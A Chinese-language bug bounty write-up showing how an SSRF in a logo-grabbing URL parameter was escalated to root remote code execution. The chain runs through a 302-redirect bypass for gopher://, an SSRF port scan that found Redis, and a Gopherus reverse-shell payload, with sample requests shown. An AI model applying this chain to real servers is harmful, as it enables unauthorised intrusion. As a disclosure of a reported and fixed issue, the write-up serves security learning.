## 一、前言
根据漏洞赏金计划的规定，我不能公开披露涉及的具体系统名称。该项目是HackerOne上持续时间最长且奖金最高的项目之一，吸引了众多安全专家对其进行测试。尽管该公司拥有世界一流的安全团队，并且多年来接受了大量安全专家的检测，但该漏洞的存在仍然令人惊讶。

## 二、侦查
对于大规模的漏洞赏金项目，通常我会进行子域名枚举以扩大攻击面。然而，在这个案例中，我专注于单一的Web应用程序。首先，我使用GAU工具获取URL和参数列表，并检查了JavaScript文件中的隐藏参数。此外，我还使用Ffuf工具进行了目录模糊测试。虽然这些方法揭示了一些有趣的参数，但并未发现明显的脆弱点。

由于初始侦查未发现任何问题，我尝试了另一种方法。通过在后台运行Burp代理来测试Web应用程序的各种功能，所有请求都被记录在Burp中，以便于后续分析。在浏览存储在代理日志中的请求时，我发现了一个带有`url`参数的GET请求：
```
GET /xxx/logoGrabber?url=http://example.com
Host: site.example.com
...
```
该请求返回有关URL标题和徽标的信息：
```json
{
    "responseTime": "99999ms",
    "grabbedUrl": "http://example.com",
    "urlInfo": {
        "pageTitle": "Example Title",
        "pageLogo": "pagelogourl"
    }
}
```
这种从URL返回信息的请求通常需要进一步测试是否存在服务器端请求伪造（SSRF）漏洞。

## 三、发现SSRF
首次尝试SSRF失败，尽管能够与外部服务器交互，但无法访问内部IP地址。接着，我决定测试是否可以访问公司的公众已知子域。经过子域枚举并逐一尝试后，发现某些无法直接访问的子域返回了内部标题和徽标信息。例如，对`somecorpsite.example.com`进行如下请求：
```
GET /xxx/logoGrabber?url=http://somecorpsite.example.com
Host: site.example.com
...
```
响应包含内部页面信息：
```json
{
    "responseTime": "9ms",
    "grabbedUrl": "http://somecorpsite.example.com",
    "urlInfo": {
        "pageTitle": "INTERNAL PAGE TITLE",
        "pageLogo": "http://somecorpsite.example.com/logos/logo.png"
    }
}
```
基于此发现，我提交了一份关于盲SSRF的报告。尽管影响有限，但该报告被接受并分类。

## 四、RCE
一个月后，我对SSRF漏洞的影响感到有些失望，因为它被认为影响较小。然而，SSRF仍未修复，于是我决定进一步研究以尝试升级漏洞。了解到Gopher协议可能有助于提升SSRF至远程代码执行（RCE），我尝试了以下请求：
```
GET /xxx/logoGrabber?url=gopher://myburpcollaboratorurl
Host: site.example.com
...
```
但请求立即失败。随后，我尝试利用重定向绕过防护机制。设置一个Python HTTP服务器，将所有GET流量重定向到Burp中的URL：
```
python3 302redirect.py port "http://mycollaboratorurl/"
```
提交请求后，确认重定向有效。接着，我再次尝试Gopher协议，这次通过重定向成功绕过了过滤器。为了确定可利用的服务，我使用SSRF进行了端口扫描，最终发现Redis服务（端口6379）开放。

使用Gopherus生成Redis反向shell负载，并通过302重定向执行。尽管最初没有看到任何反应，但在几分钟后意外收到了反向shell。验证身份后（我是root！），我断开连接并更新了原始报告。该漏洞已于2020年5月被发现/报告，并已得到修复。我最终获得了15,000美元的赏金以及公司安全团队的认可。